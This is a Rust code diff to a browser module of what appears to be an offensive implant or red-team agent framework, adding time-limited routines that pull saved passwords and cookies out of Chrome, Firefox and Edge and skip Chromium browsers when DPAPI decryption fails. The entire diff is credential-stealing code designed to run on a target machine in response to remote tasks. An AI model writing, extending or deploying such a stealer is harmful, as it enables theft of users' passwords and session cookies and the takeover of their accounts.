@@ -23,6 +23,7 @@ use common::{
 };
 use prost::Message;
 use protocol::{browser_task, BrowserTask};
+use std::time::{Duration, Instant};
 
 pub mod chrome;
 pub mod decrypt;
@@ -115,8 +116,9 @@ impl Module for BrowserModule {
             }
             Some(browser_task::Operation::All(ref req)) => {
                 let browsers: Vec<&str> = req.browsers.iter().map(String::as_str).collect();
-                let mut out = extract_passwords(&browsers)?;
-                out.extend(extract_cookies(&browsers)?);
+                let deadline = Instant::now() + Duration::from_secs(15);
+                let mut out = extract_passwords_deadline(&browsers, deadline);
+                out.extend(extract_cookies_deadline(&browsers, deadline));
                 out
             }
             None => {
@@ -189,6 +191,79 @@ fn extract_cookies(browsers: &[&str]) -> Result<Vec<CredentialInfo>, KrakenError
     }
 
     Ok(out)
+}
+
+/// Extract passwords with a hard deadline. Returns whatever was collected
+/// before the deadline expired or DPAPI became unavailable.
+fn extract_passwords_deadline(browsers: &[&str], deadline: Instant) -> Vec<CredentialInfo> {
+    let all = browsers.is_empty() || browsers.contains(&"all");
+    let mut out = Vec::new();
+
+    let targets: Vec<(&str, fn() -> Result<Vec<BrowserCredential>, KrakenError>)> = {
+        let mut v = Vec::new();
+        if all || browsers.contains(&"chrome") {
+            v.push(("chrome", chrome::extract_passwords as fn() -> _));
+        }
+        if all || browsers.contains(&"firefox") {
+            v.push(("firefox", firefox::extract_passwords as fn() -> _));
+        }
+        if all || browsers.contains(&"edge") {
+            v.push(("edge", edge::extract_passwords as fn() -> _));
+        }
+        v
+    };
+
+    for (name, extractor) in targets {
+        if Instant::now() >= deadline {
+            tracing::warn!("browser password extraction hit deadline, skipping remaining browsers");
+            break;
+        }
+        if decrypt::dpapi_is_unavailable() && name != "firefox" {
+            // Chrome/Edge require DPAPI for master key; skip if already failed
+            tracing::info!("skipping {name} passwords: DPAPI unavailable");
+            continue;
+        }
+        if let Ok(creds) = extractor() {
+            out.extend(creds.into_iter().map(cred_to_info));
+        }
+    }
+    out
+}
+
+/// Extract cookies with a hard deadline. Returns whatever was collected
+/// before the deadline expired or DPAPI became unavailable.
+fn extract_cookies_deadline(browsers: &[&str], deadline: Instant) -> Vec<CredentialInfo> {
+    let all = browsers.is_empty() || browsers.contains(&"all");
+    let mut out = Vec::new();
+
+    let targets: Vec<(&str, fn() -> Result<Vec<BrowserCookie>, KrakenError>)> = {
+        let mut v = Vec::new();
+        if all || browsers.contains(&"chrome") {
+            v.push(("chrome", chrome::extract_cookies as fn() -> _));
+        }
+        if all || browsers.contains(&"firefox") {
+            v.push(("firefox", firefox::extract_cookies as fn() -> _));
+        }
+        if all || browsers.contains(&"edge") {
+            v.push(("edge", edge::extract_cookies as fn() -> _));
+        }
+        v
+    };
+
+    for (name, extractor) in targets {
+        if Instant::now() >= deadline {
+            tracing::warn!("browser cookie extraction hit deadline, skipping remaining browsers");
+            break;
+        }
+        if decrypt::dpapi_is_unavailable() && name != "firefox" {
+            tracing::info!("skipping {name} cookies: DPAPI unavailable");
+            continue;
+        }
+        if let Ok(cookies) = extractor() {
+            out.extend(cookies.into_iter().map(cookie_to_info));
+        }
+    }
+    out
 }
 
 fn cred_to_info(c: BrowserCredential) -> CredentialInfo {
